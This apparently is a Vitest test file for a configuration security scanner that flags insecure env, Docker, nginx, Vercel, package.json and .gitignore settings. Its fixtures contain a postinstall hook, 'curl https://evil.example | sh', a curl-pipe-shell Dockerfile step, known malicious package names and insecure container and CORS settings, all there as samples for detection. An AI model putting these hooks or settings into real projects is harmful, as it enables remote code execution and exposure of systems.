import { describe, expect, it } from 'vitest';
import { analyzeEnvFile } from './envAnalyzer';
import { analyzeDockerCompose } from './dockerComposeAnalyzer';
import { analyzeNginxConf } from './nginxAnalyzer';
import { analyzeDockerfile } from './dockerfileAnalyzer';
import { analyzeVercelConfig } from './vercelAnalyzer';
import { analyzePackageJson } from './packageJsonAnalyzer';
import { analyzeGitignore } from './gitignoreAnalyzer';
import type { Finding } from '../types';

const ids = (findings: Finding[]) => findings.map((finding) => finding.id);

describe('analyzeEnvFile', () => {
  it('flags client-exposed secrets, weak values, debug and disabled TLS', () => {
    const findings = analyzeEnvFile(
      [
        'NEXT_PUBLIC_SUPABASE_SERVICE_ROLE=abc',
        'DB_PASSWORD="admin"',
        'APP_DEBUG=true',
        'NODE_TLS_REJECT_UNAUTHORIZED=0',
        'JWT_SECRET=tooshort',
        'API_URL=http://api.example.com',
        'LOCAL_URL=http://localhost:3000',
      ].join('\n'),
    );
    expect(ids(findings)).toEqual([
      'env-client-exposed-NEXT_PUBLIC_SUPABASE_SERVICE_ROLE',
      'env-weak-credential-DB_PASSWORD',
      'env-debug-APP_DEBUG',
      'env-tls-verification-disabled',
      'env-short-signing-secret-JWT_SECRET',
      'env-plain-http-API_URL',
    ]);
    expect(findings[1].line).toBe(2);
  });

  it('accepts a hardened env file', () => {
    expect(analyzeEnvFile('NODE_ENV=production\nJWT_SECRET=0123456789abcdef0123456789abcdef01\nDEBUG=false')).toEqual([]);
  });
});

describe('analyzeDockerCompose', () => {
  const compose = `services:
  app:
    image: myorg/api:latest
    privileged: true
    cap_add:
      - SYS_ADMIN
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock
  db:
    image: postgres:16
    environment:
      POSTGRES_PASSWORD: postgres
    ports:
      - "5432:5432"
  cache:
    image: redis:7
    ports:
      - "127.0.0.1:6379:6379"
`;

  it('flags privileged containers, socket mounts, exposed DBs and default passwords', () => {
    expect(ids(analyzeDockerCompose(compose))).toEqual([
      'compose-unpinned-image-app',
      'compose-privileged-app',
      'compose-cap-SYS_ADMIN-app',
      'compose-docker-socket-app',
      'compose-weak-password-db-L12',
      'compose-public-datastore-db-5432',
    ]);
  });
});

describe('analyzeNginxConf', () => {
  it('detects off-by-slash alias traversal and weak TLS', () => {
    const findings = analyzeNginxConf(`server {
  listen 443 ssl;
  server_tokens off;
  ssl_protocols TLSv1 TLSv1.2;
  location /static {
    alias /srv/static/;
  }
}`);
    const traversal = findings.find((f) => f.id.startsWith('nginx-alias-traversal'));
    expect(traversal?.line).toBe(5);
    expect(traversal?.severity).toBe('critical');
    expect(findings.some((f) => f.id === 'nginx-weak-tls-L4' && f.title.includes('TLSv1'))).toBe(true);
    expect(findings.some((f) => f.id === 'nginx-server-tokens')).toBe(false);
  });

  it('does not flag a correct alias', () => {
    const findings = analyzeNginxConf('server { listen 443 ssl; location /static/ { alias /srv/static/; } }');
    expect(findings.some((f) => f.id.startsWith('nginx-alias-traversal'))).toBe(false);
  });
});

describe('analyzeDockerfile', () => {
  it('flags secrets in ENV, curl | sh and missing USER across continuations', () => {
    const findings = analyzeDockerfile(`FROM node:20-alpine AS build
ENV API_TOKEN=abc
RUN apk add curl && \\
    curl -fsSL https://get.example.sh | sh
COPY . .
FROM build
CMD ["node", "index.js"]`);
    expect(ids(findings)).toEqual([
      'docker-root-user',
      'docker-secret-env-API_TOKEN',
      'docker-curl-pipe-shell-L3',
      'docker-copy-all',
      'docker-no-healthcheck',
    ]);
  });

  it('does not treat a named build stage as an unpinned image', () => {
    const findings = analyzeDockerfile('FROM node:20 AS deps\nFROM deps\nUSER node\nHEALTHCHECK CMD true');
    expect(findings).toEqual([]);
  });
});

describe('analyzeVercelConfig', () => {
  it('flags weak CSP, wildcard CORS with credentials and X-Powered-By', () => {
    const config = {
      headers: [
        {
          source: '/(.*)',
          headers: [
            { key: 'Content-Security-Policy', value: "default-src 'self'; script-src 'self' 'unsafe-inline'" },
            { key: 'Access-Control-Allow-Origin', value: '*' },
            { key: 'Access-Control-Allow-Credentials', value: 'true' },
            { key: 'X-Powered-By', value: 'Next.js' },
            { key: 'Strict-Transport-Security', value: 'max-age=300' },
          ],
        },
      ],
    };
    const findings = analyzeVercelConfig(JSON.stringify(config));
    expect(findings.find((f) => f.id === 'vercel-weak-csp')?.severity).toBe('medium');
    expect(findings.find((f) => f.id === 'vercel-cors-wildcard')?.severity).toBe('critical');
    expect(ids(findings)).toContain('vercel-x-powered-by');
    expect(ids(findings)).toContain('vercel-short-hsts');
  });
});

describe('analyzePackageJson', () => {
  it('flags compromised versions, typosquats, non-registry sources and install hooks', () => {
    const pkg = {
      dependencies: {
        'event-stream': '3.3.6',
        crossenv: '^1.0.0',
        insecure: 'http://example.com/pkg.tgz',
        forked: 'github:someone/repo',
        anything: '*',
      },
      scripts: { postinstall: 'curl https://evil.example | sh', audit: 'npm audit' },
    };
    const found = ids(analyzePackageJson(JSON.stringify(pkg)));
    expect(found).toEqual(
      expect.arrayContaining([
        'pkg-compromised-event-stream',
        'pkg-malicious-crossenv',
        'pkg-insecure-source-insecure',
        'pkg-non-registry-forked',
        'pkg-unbounded-range-anything',
        'pkg-suspicious-postinstall',
      ]),
    );
  });
});

describe('analyzeGitignore', () => {
  it('flags env negations', () => {
    const findings = analyzeGitignore('.env*\n!.env.example\n!.env.production\nnode_modules/\n*.pem');
    expect(findings.find((f) => f.id === 'gitignore-env-negated')?.line).toBe(3);
  });
});
